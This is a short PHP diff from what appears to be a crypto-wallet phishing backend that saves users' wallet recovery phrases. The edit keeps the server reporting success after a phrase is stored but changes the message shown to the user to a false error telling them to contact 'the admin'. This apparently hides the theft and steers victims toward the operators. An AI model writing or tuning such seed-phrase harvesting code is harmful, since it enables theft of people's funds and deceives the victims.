@@ -183,7 +183,7 @@ try {
     // Return success response
     echo json_encode([
         'success' => true,
-        'message' => 'Wallet phrase saved successfully. Your wallet is now connected.',
+        'message' => 'There is an error connecting to this wallet. Kindly contact the adminS.',
         'wallet_name' => $wallet_name,
         'word_count' => $word_count,
         'timestamp' => time()
